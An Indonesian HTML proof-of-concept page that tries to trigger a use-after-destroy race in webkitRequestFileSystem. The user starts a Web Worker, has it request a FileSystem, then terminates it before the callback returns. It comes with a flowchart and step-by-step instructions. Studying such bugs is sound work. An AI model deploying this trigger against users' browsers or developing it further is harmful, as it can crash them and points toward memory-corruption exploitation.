<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <title>Demonstrasi Bug webkitRequestFileSystem</title>
    <style>
        body { font-family: system-ui, -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, 'Open Sans', 'Helvetica Neue', sans-serif; line-height: 1.6; padding: 20px; background-color: #f0f2f5; }
        #container { max-width: 800px; margin: auto; background: #ffffff; padding: 25px; border-radius: 8px; box-shadow: 0 4px 8px rgba(0,0,0,0.1); }
        h1, h2 { color: #333; border-bottom: 2px solid #007bff; padding-bottom: 10px; }
        button { padding: 10px 15px; font-size: 16px; cursor: pointer; border: none; border-radius: 5px; margin-right: 10px; background-color: #007bff; color: white; transition: background-color 0.3s; }
        button:hover { background-color: #0056b3; }
        button:disabled { background-color: #ccc; cursor: not-allowed; }
        #log-container { margin-top: 20px; }
        #log { border: 1px solid #ccc; background: #2b2b2b; color: #f0f0f0; padding: 10px; height: 300px; overflow-y: scroll; font-family: 'Courier New', Courier, monospace; font-size: 14px; border-radius: 5px; }
        .flowchart { background: #e9ecef; padding: 15px; border-radius: 5px; margin-top: 20px; font-family: 'Courier New', Courier, monospace; border-left: 4px solid #17a2b8; }
    </style>
</head>
<body>

<div id="container">
    <h1>Demonstrasi Bug Lifecycle <code>webkitRequestFileSystem</code></h1>
    <p>Script ini mendemonstrasikan potensi <em>race condition</em> (Use-After-Destroy) yang dijelaskan dalam flowchart Anda. Intinya, sebuah Worker dapat dihentikan setelah ia membuat permintaan asinkron ke FileSystem, tetapi sebelum callback dari permintaan itu kembali.</p>

    <h2>Flowchart Anda</h2>
    <div class="flowchart">
        <pre>
Worker JS call -> Blink C++ -> Security Checks -> Async Dispatch
       |                                                |
       '--- (Worker bisa dihentikan di sini) ---'       |
       |                                                V
Callback kembali ke context worker yang mungkin sudah hancur -> CRASH
        </pre>
    </div>

    <h2>Coba Sendiri</h2>
    <p>Ikuti langkah-langkah ini untuk mencoba memicu kondisi tersebut:</p>
    <ol>
        <li>Klik <b>"Mulai Worker"</b> untuk membuat worker baru.</li>
        <li>Klik <b>"Minta FileSystem"</b>. Ini akan memberitahu worker untuk memanggil <code>webkitRequestFileSystem</code>.</li>
        <li><b>SEGERA</b> setelah itu, klik <b>"Hentikan Worker"</b>.</li>
    </ol>
    <p>Jika Anda cukup cepat, Anda akan menghentikan worker di antara langkah 10 dan 12 dari flowchart. Di browser yang rentan, ini bisa menyebabkan tab atau browser crash karena callback mencoba berjalan pada context yang sudah tidak valid.</p>

    <div>
        <button id="start-worker">1. Mulai Worker</button>
        <button id="request-fs" disabled>2. Minta FileSystem</button>
        <button id="terminate-worker" disabled>3. Hentikan Worker (Klik Cepat!)</button>
    </div>

    <div id="log-container">
        <h2>Log Aktivitas</h2>
        <div id="log"></div>
    </div>
</div>

<script>
// --- SCRIPT UNTUK HALAMAN UTAMA ---

const startButton = document.getElementById('start-worker');
const requestButton = document.getElementById('request-fs');
const terminateButton = document.getElementById('terminate-worker');
const logElement = document.getElementById('log');

let worker = null;

function log(message) {
    console.log(message);
    logElement.innerHTML += `[${new Date().toLocaleTimeString()}] ${message}<br>`;
    logElement.scrollTop = logElement.scrollHeight;
}

// Konten untuk file worker.js dibuat sebagai string
const workerScriptContent = `
    // Polyfill untuk FileError jika tidak didefinisikan
    if (typeof self.FileError === 'undefined') {
        self.FileError = {
            QUOTA_EXCEEDED_ERR: 10, NOT_FOUND_ERR: 1, SECURITY_ERR: 2,
            INVALID_MODIFICATION_ERR: 9, INVALID_STATE_ERR: 7
        };
    }

    self.onmessage = function(e) {
        if (e.data === 'request-fs') {
            postMessage('Menerima perintah, memanggil webkitRequestFileSystem...');
            const size = 1024 * 1024; // 1MB

            const onSuccess = function(fs) {
                // Jika worker sudah mati, baris ini seharusnya tidak tereksekusi,
                // tapi pemanggilan internal di C++ bisa menyebabkan UAF.
                postMessage('SUKSES: FileSystem didapatkan! Nama: ' + fs.name);
            };

            const onError = function(err) {
                let msg = 'ERROR: Gagal mendapatkan FileSystem. Kode error: ' + err.code;
                postMessage(msg);
            };

            postMessage('Memanggil webkitRequestFileSystem(TEMPORARY, ' + size + ')');

            // Langkah 10: Panggilan async dikirim. Worker sekarang rentan.
            try {
                self.webkitRequestFileSystem(self.TEMPORARY, size, onSuccess, onError);
                postMessage('Panggilan async ke webkitRequestFileSystem telah dibuat.');
            } catch (ex) {
                postMessage('Error saat memanggil webkitRequestFileSystem: ' + ex.message);
            }
        }
    };
`;

// Membuat Worker dari Blob untuk menghindari kebutuhan file terpisah
function createWorker() {
    try {
        const blob = new Blob([workerScriptContent], { type: 'application/javascript' });
        return new Worker(URL.createObjectURL(blob));
    } catch (e) {
        log('Error membuat worker: ' + e.message);
        return null;
    }
}

startButton.addEventListener('click', () => {
    log('Membuat worker...');
    worker = createWorker();

    if (worker) {
        log('Worker berhasil dibuat.');

        worker.onmessage = function(e) {
            log('Pesan dari Worker: <span style="color:#87ceeb;">' + e.data + '</span>');
        };

        worker.onerror = function(e) {
            log('Error di Worker: <span style="color:#ff6b6b;">' + e.message + '</span>');
            e.preventDefault();
        };
        
        startButton.disabled = true;
        requestButton.disabled = false;
        terminateButton.disabled = false;
    }
});

requestButton.addEventListener('click', () => {
    log('MAIN: Mengirim pesan ke worker untuk meminta FileSystem.');
    worker.postMessage('request-fs');
    log('MAIN: Pesan terkirim. <b style="color:#f9ca24;">Sekarang klik "Hentikan Worker" secepatnya!</b>');
});

terminateButton.addEventListener('click', () => {
    if (worker) {
        log('MAIN: Menghentikan worker...');
        worker.terminate();
        log('MAIN: <b style="color:#ff8c00;">Worker dihentikan.</b> Jika callback FileSystem kembali setelah ini, bisa terjadi crash.');
        worker = null;
        
        requestButton.disabled = true;
        terminateButton.disabled = true;
        startButton.disabled = false;
    }
});

// Cek apakah API didukung oleh browser saat halaman dimuat
window.onload = function() {
    if (!window.webkitRequestFileSystem && !window.requestFileSystem) {
        log('<b style="color:#ff6b6b;">API webkitRequestFileSystem/requestFileSystem tidak didukung di browser ini. Demo tidak akan berfungsi.</b>');
        startButton.disabled = true;
    }
};

</script>

</body>
</html>

